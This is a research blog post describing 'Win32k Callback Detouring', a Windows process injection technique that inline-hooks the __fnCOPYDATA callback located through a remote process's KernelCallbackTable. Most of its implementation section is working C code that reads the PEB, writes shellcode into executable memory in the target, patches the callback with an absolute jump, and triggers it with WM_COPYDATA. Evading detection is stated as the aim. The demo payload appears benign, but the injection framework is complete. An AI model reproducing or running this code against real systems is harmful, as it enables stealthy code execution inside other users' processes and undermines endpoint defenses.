---
title: "Win32k Callback Detouring (Research)"
description: "Abusing Legitimate Kernel-to-User Callback Dispatch for Code Execution"
pubDate: 2026-04-14
tags: [research, internals]
---

## Overview

This injection technique abuses the kernel-to-user callback dispatch path used by the Windows graphical subsystem (**`win32k.sys`**) to obtain code execution inside a remote process. By locating the **`KernelCallbackTable`**` through the target process’s `**Process Environment Block (PEB)**`, an operator can enumerate callback entries and identify legitimate user-mode routines invoked during GUI-related kernel transitions.

Instead of performing traditional **_KernelCallbackTable Injection_**, where a callback entry is overwritten directly with the shellcode address, this variation hooks the legitimate callback target referenced by the table and redirects execution to attacker-controlled shellcode upon invocation. Because execution is hijacked through an existing and expected callback path, the technique can provide a stealthier alternative to more conventional primitives such as remote thread creation or **_APC-based injection_**.

---

## Understanding the Mechanism

### Windows Callback Dispatch Flow

The Windows graphical subsystem delegates portions of GUI-related processing to user mode through a callback mechanism initiated from kernel mode. When **`win32k.sys`** requires logic to execute within the context of a GUI process, it invokes **`KeUserModeCallback`** to perform a controlled transition from kernel mode to user mode while preserving the isolation boundary between both execution contexts.

This transition establishes the legitimate execution path through which the kernel dispatches graphical subsystem callbacks into user mode—the same path later abused by the presented technique.

---

### KiUserCallbackDispatcher

Once the transition completes, execution enters **`KiUserCallbackDispatcher`**, an **`ntdll.dll`** routine responsible for receiving the callback index supplied by the kernel and dispatching execution to the corresponding user-mode callback handler. This routine serves as the mandatory entry point for all callbacks initiated through **`KeUserModeCallback`**.

Because all callback resolution converges at this dispatcher, **`KiUserCallbackDispatcher`** functions as the central pivot between kernel callback requests and their eventual user-mode execution.

---

### KernelCallbackTable Resolution Path

To resolve the destination of a requested callback, **`KiUserCallbackDispatcher`** consults the **`KernelCallbackTable`** stored in the target process’s **PEB**. Each table entry contains a pointer to a user-mode callback routine associated with a specific graphical subsystem operation, typically implemented in **`user32.dll`**.

Traditional **_KernelCallbackTable Injection_** techniques directly overwrite one or more of these entries to redirect execution. While effective, modifying the table itself introduces structural anomalies that may be trivially detected through integrity validation of the **PEB** or callback table contents. The presented technique avoids this by preserving the table structure and instead detouring the callback target referenced by the entry.

---

### Leveraging __fnCOPYDATA as an Execution Primitive

Among the available **KernelCallbackTable** entries, **`__fnCOPYDATA`** provides a particularly convenient trigger primitive because it can be externally invoked by delivering a **_WM_COPYDATA_** message via **_SendMessage()_**. This allows the callback to be triggered deterministically without requiring unusual process state or complex interaction.

By leveraging a naturally accessible and frequently used callback target, the technique obtains a reliable execution primitive while remaining fully within the expected callback dispatch chain prior to redirection.

---

![kcallbackflow](https://github.com/user-attachments/assets/ef2181e0-440c-4c76-a82d-c7ce9efdd94a)

---

## How It Works

The technique begins by locating the target process and reading its **PEB** to recover the address of the **`KernelCallbackTable`**, from which the callback pointer for **`__fnCOPYDATA`** is resolved. Executable memory is then allocated within the remote process, and attacker-controlled shellcode is written into the allocated region. Prior to modification, the original bytes of the legitimate callback routine are preserved to enable later restoration.

An inline hook is subsequently installed at the start of the resolved **`__fnCOPYDATA`** routine, replacing its prologue with an absolute jump to the injected shellcode. To trigger execution, a **_WM_COPYDATA_** message is sent to the target window, causing the Windows graphical subsystem to dispatch **`__fnCOPYDATA`** through the standard kernel-to-user callback chain. Once execution completes, the original callback bytes are restored to preserve process stability and reduce residual modification artifacts.

---

## Implementation

### Step 1: Obtain the Remote Process PEB and KernelCallbackTable

The **`KernelCallbackTable`** is located at offset **_0x58_** within the **PEB**:

![dt_peb](https://github.com/user-attachments/assets/9db90ce0-c7eb-46ab-9c6b-5e5a2cc96c8d)

The following logic is used to obtain it:

```c
PROCESS_BASIC_INFORMATION pbi;
PEB                       peb;
KERNELCALLBACKTABLE       kct;

if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != STATUS_SUCCESS)
{
    NtClose(hProcess);
    return 1;
}

/* Read remote PEB */
if (NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL) != STATUS_SUCCESS)
{
    NtClose(hProcess);
    return 1;
}

/* Ensure KernelCallbackTable is present */
if (!peb.KernelCallbackTable) {
    NtClose(hProcess);
    return 1;
}

/* Read KernelCallbackTable contents */
if (NtReadVirtualMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL) != STATUS_SUCCESS)
{
    NtClose(hProcess);
    return 1;
}
```

The code begins by calling **`NtQueryInformationProcess`** with the `ProcessBasicInformation` information class to populate a **`PROCESS_BASIC_INFORMATION`** structure, which exposes the remote process’s **PEB** address through the `PebBaseAddress` field.

Next, **`NtReadVirtualMemory`** is used to read the remote **PEB** into a local **`PEB`** structure, allowing extraction of the **KernelCallbackTable** pointer stored within the process environment. After validating that the callback table is present, a second **`NtReadVirtualMemory`** call copies the remote **`KERNELCALLBACKTABLE`** structure into local memory, enabling direct resolution of callback targets such as **`__fnCOPYDATA`** for subsequent detouring.

![kct_callback](https://github.com/user-attachments/assets/b445245c-3317-4650-a3e3-c0a356927481)

---

### Step 2: Allocate Shellcode in the Remote Process

```c
 PVOID   remoteShellcodeAddr      = NULL;
    SIZE_T  shellcodeSize   = sizeof(g_CalcSh);

    if (NtAllocateVirtualMemory(hProcess, &remoteShellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == STATUS_SUCCESS) {
        if (NtWriteVirtualMemory(hProcess, remoteShellcodeAddr, g_CalcSh, sizeof(g_CalcSh), NULL) == STATUS_SUCCESS) {

            printf("[+] shellcode @ 0x%p\n", remoteShellcodeAddr);
```

**`NtAllocateVirtualMemory`** reserves executable memory inside the remote process and returns its base address through `remoteShellcodeAddr`. The allocation size is derived from the shellcode buffer length.

**`NtWriteVirtualMemory`** then copies the shellcode into the allocated region, staging the payload in the target process for later execution through the callback detour.

---

### Step 3: Install the Inline Hook and Trigger Execution

```c
int InitializeHookRemote(HANDLE hProcess, PVOID pRemoteFunc, PVOID pRemoteDetour, PINLINEHOOKTABLE Hook) {

    if (!pRemoteFunc || !pRemoteDetour || !Hook || !NtProtectVirtualMemory || !NtReadVirtualMemory) return 0;

    Hook->pOriginalFunction     = pRemoteFunc;
    Hook->pFunctionDetour       = pRemoteDetour;

    if (NtReadVirtualMemory(hProcess, pRemoteFunc, Hook->pObjBytes, JMP_SIZE, NULL) != STATUS_SUCCESS) return 0;

    PVOID   pBaseAddress    = pRemoteFunc;
    SIZE_T  sRegionSize     = JMP_SIZE;
    if (NtProtectVirtualMemory(hProcess, &pBaseAddress, &sRegionSize, PAGE_EXECUTE_READWRITE, &Hook->dwOldProtection) != STATUS_SUCCESS) return 0;

    return 1;
}
```
**`InitializeHookRemote`** prepares the remote callback target for detouring by storing the original function and detour addresses inside the **`INLINEHOOKTABLE`** structure. It preserves the original callback prologue by reading the first bytes of the target routine with **`NtReadVirtualMemory`**, then changes the protection of that region to **`PAGE_EXECUTE_READWRITE`** using **`NtProtectVirtualMemory`** so it can be patched safely.


```c
int InstallHookRemote(HANDLE hProcess, PINLINEHOOKTABLE Hook) {
    if (!Hook || !Hook->pOriginalFunction || !NtWriteVirtualMemory) return 0;

    BYTE    g_Jump[]   = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pRemoteDetour
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    UINT64  uPatch     = (UINT64)(Hook->pFunctionDetour);
    RtlCopyMemory(&g_Jump[2], &uPatch, sizeof(uPatch));

    if (NtWriteVirtualMemory(hProcess, Hook->pOriginalFunction, g_Jump, sizeof(g_Jump), NULL) != STATUS_SUCCESS) return 0;

    printf("[+] Hook installed in remote process @ 0x%p\n", Hook->pOriginalFunction);
    return 1;
}
```
**`InstallHookRemote`** constructs an absolute x64 jump stub (`mov r10, <detour>; jmp r10`) that redirects execution to the injected shellcode. The jump stub is then written over the beginning of the target callback routine via **`NtWriteVirtualMemory`**, effectively installing the inline hook.


```c
int RemoveHookRemote(HANDLE hProcess, PINLINEHOOKTABLE Hook) {
    if (!Hook || !Hook->pOriginalFunction || !NtWriteVirtualMemory || !NtProtectVirtualMemory) return 0;

    ULONG   tmpProtection       = 0;
    PVOID   funcBaseAddr        = Hook->pOriginalFunction;
    SIZE_T  regionSize          = JMP_SIZE;

    NTSTATUS status = NtWriteVirtualMemory(hProcess, Hook->pOriginalFunction, Hook->pObjBytes, JMP_SIZE, NULL);
    NtProtectVirtualMemory(hProcess, &funcBaseAddr, &regionSize, Hook->dwOldProtection, &tmpProtection);

    return (status == STATUS_SUCCESS);
}
```
**`RemoveHookRemote`** restores the original callback routine by writing back the preserved prologue bytes stored in the **`INLINEHOOKTABLE`** structure. It then reinstates the original memory protection attributes of the patched region using **`NtProtectVirtualMemory`**, removing the inline hook and returning the callback target to its initial state.

```c
INLINEHOOKTABLE FnCopyDataHook = { 0 };

if (InitializeHookRemote(hProcess, kct.__fnCOPYDATA, remoteShellcodeAddr, &FnCopyDataHook)) {
    if (InstallHookRemote(hProcess, &FnCopyDataHook)) {

        printf("[>] Triggering WM_COPYDATA callback...\n");

        COPYDATASTRUCT cds = {
            1,
            (DWORD)wcslen(msg) * sizeof(WCHAR),
            msg
        };

        SendMessageW(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);

        RemoveHookRemote(hProcess, &FnCopyDataHook);
    }
}
```

To trigger execution, a **`WM_COPYDATA`** message is sent to the target window via **`SendMessageW`**, forcing the Windows callback dispatcher to invoke the hooked **`__fnCOPYDATA`** routine through the normal kernel-to-user callback path. After execution completes, **`RemoveHookRemote`** restores the original callback bytes to preserve process stability.

---

## Execution

Once the logic is implemented, the proof of concept can be executed to produce the following result:

![fin_exec](https://github.com/user-attachments/assets/b7809547-6322-4e8e-b593-82e3c7ff9858)
